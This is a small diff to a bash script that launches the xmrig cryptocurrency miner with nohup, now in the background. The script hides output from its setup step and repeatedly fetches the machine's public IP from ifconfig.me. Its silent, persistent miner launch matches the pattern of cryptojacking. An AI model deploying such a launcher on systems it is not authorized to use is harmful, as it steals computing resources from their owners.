@@ -1,5 +1,5 @@
 #!/bin/bash
 
 chmod +x xmrig  >/dev/null 2>&1
-nohup ./xmrig --config=config.json >/dev/null 2>&1
+nohup ./xmrig --config=config.json &
 while :; do ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ); sleep 2; done
